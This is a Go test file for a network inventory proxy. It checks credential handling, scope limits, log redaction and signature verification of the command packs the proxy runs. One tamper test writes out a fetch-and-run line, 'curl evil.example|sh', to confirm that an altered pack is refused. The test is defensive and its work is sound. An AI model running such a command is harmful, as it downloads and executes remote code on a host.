package discovery

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"encoding/base64"
	"encoding/json"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/knownhosts"

	"nudgebee/forager/pkg/proxy"
)

func newTestProxy(t *testing.T, cfg map[string]any, creds map[string]string) (*Proxy, *bytes.Buffer) {
	t.Helper()

	var logBuf bytes.Buffer
	logger := slog.New(slog.NewTextHandler(&logBuf, &slog.HandlerOptions{Level: slog.LevelDebug}))

	p := New(logger)
	if err := p.Configure(cfg, creds); err != nil {
		t.Fatalf("configuring proxy: %v", err)
	}
	return p, &logBuf
}

func packPubKeyB64(t *testing.T) (string, ed25519.PrivateKey) {
	t.Helper()
	pub, priv, err := ed25519.GenerateKey(nil)
	if err != nil {
		t.Fatalf("generating pack key: %v", err)
	}
	return base64.StdEncoding.EncodeToString(pub), priv
}

func TestConfigure_RequiresCredentials(t *testing.T) {
	p := New(slog.New(slog.DiscardHandler))

	if err := p.Configure(map[string]any{}, map[string]string{}); err == nil {
		t.Fatal("configure accepted empty credentials")
	}
	if err := p.Configure(map[string]any{}, map[string]string{"username": "x"}); err == nil {
		t.Fatal("configure accepted a username with no auth method")
	}
}

// A pack we cannot verify must not run. Without a key configured there is no
// trust root, so every pack is untrusted.
func TestHandleInventory_RefusesWithoutPackKey(t *testing.T) {
	p, _ := newTestProxy(t, map[string]any{}, map[string]string{
		"username": "nudgebee-ro", "password": "x",
	})

	_, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
		Action: "discovery_inventory",
		Params: map[string]any{
			"targets":      []any{"10.0.1.5"},
			"content_pack": validBody,
		},
	})
	if err == nil {
		t.Fatal("inventory ran without a pack verification key")
	}
	if !strings.Contains(err.Error(), "pack public key") {
		t.Errorf("error = %q, want it to name the missing key", err)
	}
}

func TestHandleInventory_RefusesTamperedPack(t *testing.T) {
	pubB64, priv := packPubKeyB64(t)
	p, _ := newTestProxy(t, map[string]any{"pack_public_key": pubB64}, map[string]string{
		"username": "nudgebee-ro", "password": "x",
	})

	tampered := strings.Replace(signPack(t, validBody, priv), "rpm -qa", "curl evil.example|sh", 1)

	_, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
		Action: "discovery_inventory",
		Params: map[string]any{"targets": []any{"10.0.1.5"}, "content_pack": tampered},
	})
	if err == nil {
		t.Fatal("tampered pack was executed")
	}
}

// Scope is server-configured; a target outside it is reported as a result
// rather than silently dropped or quietly collected.
func TestHandleInventory_RejectsOutOfScopeTargets(t *testing.T) {
	pubB64, priv := packPubKeyB64(t)
	p, _ := newTestProxy(t, map[string]any{
		"pack_public_key": pubB64,
		"allowed_cidrs":   []any{"10.0.1.0/24"},
	}, map[string]string{"username": "nudgebee-ro", "password": "x"})

	resp, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
		Action: "discovery_inventory",
		Params: map[string]any{
			"targets":      []any{"192.168.99.5"},
			"content_pack": signPack(t, validBody, priv),
		},
	})
	if err != nil {
		t.Fatalf("inventory failed: %v", err)
	}

	var out InventoryResponse
	if err := json.Unmarshal([]byte(resp.Data), &out); err != nil {
		t.Fatalf("parsing response: %v", err)
	}
	if len(out.Targets) != 1 {
		t.Fatalf("targets = %d, want 1", len(out.Targets))
	}
	if out.Targets[0].Status != StatusError {
		t.Errorf("status = %s, want error for out-of-scope target", out.Targets[0].Status)
	}
	if !strings.Contains(out.Targets[0].Error, "allowed_cidrs") {
		t.Errorf("error %q does not explain the scope rejection", out.Targets[0].Error)
	}
}

// The response carries the pack version so the server can correlate results
// with the collector semantics that produced them.
func TestHandleInventory_ReportsPackVersion(t *testing.T) {
	pubB64, priv := packPubKeyB64(t)
	p, _ := newTestProxy(t, map[string]any{
		"pack_public_key": pubB64,
		"allowed_cidrs":   []any{"10.0.1.0/24"},
	}, map[string]string{"username": "nudgebee-ro", "password": "x"})

	resp, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
		Action: "discovery_inventory",
		Params: map[string]any{
			"targets":      []any{"192.168.99.5"}, // out of scope: no dialing needed
			"content_pack": signPack(t, validBody, priv),
		},
	})
	if err != nil {
		t.Fatalf("inventory failed: %v", err)
	}

	var out InventoryResponse
	if err := json.Unmarshal([]byte(resp.Data), &out); err != nil {
		t.Fatalf("parsing response: %v", err)
	}
	if out.ContentPackVersion != 3 {
		t.Errorf("content_pack_version = %d, want 3", out.ContentPackVersion)
	}
}

// Credentials must never reach logs or the action response: the response
// travels to the cloud, and logs are commonly shipped off-box.
func TestHandleInventory_DoesNotLeakCredentials(t *testing.T) {
	const secret = "sup3rs3cr3t-p4ssw0rd"

	pubB64, priv := packPubKeyB64(t)
	p, logBuf := newTestProxy(t, map[string]any{
		"pack_public_key":      pubB64,
		"allowed_cidrs":        []any{"10.0.1.0/24"},
		"dial_timeout_seconds": 1,
		"host_timeout_seconds": 2,
	}, map[string]string{"username": "nudgebee-ro", "password": secret})

	resp, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
		Action: "discovery_inventory",
		Params: map[string]any{
			"targets":      []any{"10.0.1.5", "192.168.99.5"},
			"content_pack": signPack(t, validBody, priv),
		},
	})
	if err != nil {
		t.Fatalf("inventory failed: %v", err)
	}

	if strings.Contains(resp.Data, secret) {
		t.Error("credential appeared in the action response")
	}
	if strings.Contains(logBuf.String(), secret) {
		t.Error("credential appeared in the logs")
	}
}

// The security of this module rests on one invariant: no command reaches a
// host unless it came from a pack whose signature verified. This test pins
// that invariant against future refactors — the paths into execution are
// handleInventory -> resolvePack -> verifyPack, and every one of them must
// refuse rather than degrade.
func TestHandleInventory_NoUnverifiedCommandPath(t *testing.T) {
	_, priv := packPubKeyB64(t)
	otherPubB64, _ := packPubKeyB64(t)

	cases := []struct {
		name string
		cfg  map[string]any
		pack string
	}{
		{"no key configured", map[string]any{}, signPack(t, validBody, priv)},
		{"unsigned pack", map[string]any{"pack_public_key": otherPubB64}, validBody},
		{"signed by another key", map[string]any{"pack_public_key": otherPubB64}, signPack(t, validBody, priv)},
		{"version with no cache or pack_dir", map[string]any{"pack_public_key": otherPubB64}, ""},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p, _ := newTestProxy(t, tc.cfg, map[string]string{
				"username": "nudgebee-ro", "password": "x",
			})

			params := map[string]any{"targets": []any{"10.0.1.5"}}
			if tc.pack != "" {
				params["content_pack"] = tc.pack
			} else {
				params["content_pack_version"] = 3
			}

			if _, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
				Action: "discovery_inventory",
				Params: params,
			}); err == nil {
				t.Fatalf("commands would have executed without a verified pack: %s", tc.name)
			}
		})
	}
}

func TestHandleInventory_ValidatesParams(t *testing.T) {
	pubB64, _ := packPubKeyB64(t)
	p, _ := newTestProxy(t, map[string]any{"pack_public_key": pubB64}, map[string]string{
		"username": "nudgebee-ro", "password": "x",
	})

	cases := []struct {
		name   string
		params map[string]any
	}{
		{"no targets", map[string]any{"content_pack": validBody}},
		{"empty targets", map[string]any{"targets": []any{}, "content_pack": validBody}},
		{"non-string targets", map[string]any{"targets": []any{42}, "content_pack": validBody}},
		{"no pack", map[string]any{"targets": []any{"10.0.1.5"}}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if _, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{
				Action: "discovery_inventory",
				Params: tc.params,
			}); err == nil {
				t.Fatalf("accepted invalid params: %s", tc.name)
			}
		})
	}
}

func TestHandleRequest_UnknownAction(t *testing.T) {
	pubB64, _ := packPubKeyB64(t)
	p, _ := newTestProxy(t, map[string]any{"pack_public_key": pubB64}, map[string]string{
		"username": "nudgebee-ro", "password": "x",
	})

	if _, err := p.HandleRequest(context.Background(), &proxy.ActionRequest{Action: "discovery_sweep"}); err == nil {
		t.Fatal("accepted an action this module does not implement")
	}
}

// HealthCheck reports configuration validity: there is no single endpoint to
// probe when the datasource's target is an entire network segment.
func TestHealthCheck(t *testing.T) {
	pubB64, _ := packPubKeyB64(t)

	unconfigured := New(slog.New(slog.DiscardHandler))
	if err := unconfigured.HealthCheck(context.Background()); err == nil {
		t.Error("unconfigured proxy reported healthy")
	}

	noKey, _ := newTestProxy(t, map[string]any{}, map[string]string{
		"username": "nudgebee-ro", "password": "x",
	})
	if err := noKey.HealthCheck(context.Background()); err == nil {
		t.Error("proxy without a pack key reported healthy")
	}

	ready, _ := newTestProxy(t, map[string]any{"pack_public_key": pubB64}, map[string]string{
		"username": "nudgebee-ro", "password": "x",
	})
	if err := ready.HealthCheck(context.Background()); err != nil {
		t.Errorf("configured proxy reported unhealthy: %v", err)
	}
}

// Customers who can supply host keys get real verification; a bad path must
// fail configuration loudly rather than silently falling back to accepting
// any key.
func TestConfigure_KnownHostsFile(t *testing.T) {
	dir := t.TempDir()
	khPath := filepath.Join(dir, "known_hosts")

	pub, _, err := ed25519.GenerateKey(nil)
	if err != nil {
		t.Fatalf("generating host key: %v", err)
	}
	sshPub, err := ssh.NewPublicKey(pub)
	if err != nil {
		t.Fatalf("converting key: %v", err)
	}
	line := knownhosts.Line([]string{"10.0.1.15:22"}, sshPub)
	if err := os.WriteFile(khPath, []byte(line+"\n"), 0o600); err != nil {
		t.Fatalf("writing known_hosts: %v", err)
	}

	p := New(slog.New(slog.DiscardHandler))
	if err := p.Configure(map[string]any{"known_hosts_file": khPath}, map[string]string{
		"username": "nudgebee-ro", "password": "x",
	}); err != nil {
		t.Fatalf("configuring with known_hosts: %v", err)
	}

	missing := New(slog.New(slog.DiscardHandler))
	err = missing.Configure(map[string]any{"known_hosts_file": filepath.Join(dir, "nope")}, map[string]string{
		"username": "nudgebee-ro", "password": "x",
	})
	if err == nil {
		t.Fatal("configure accepted an unreadable known_hosts_file instead of failing")
	}
}

func TestConfigDefaults(t *testing.T) {
	cfg := Config{}
	applyConfigDefaults(&cfg)

	if cfg.Port != defaultPort {
		t.Errorf("port = %d, want %d", cfg.Port, defaultPort)
	}
	if cfg.Concurrency != defaultConcurrency {
		t.Errorf("concurrency = %d, want %d", cfg.Concurrency, defaultConcurrency)
	}

	over := Config{Concurrency: maxConcurrency * 10}
	applyConfigDefaults(&over)
	if over.Concurrency != maxConcurrency {
		t.Errorf("concurrency = %d, want it clamped to %d", over.Concurrency, maxConcurrency)
	}
}
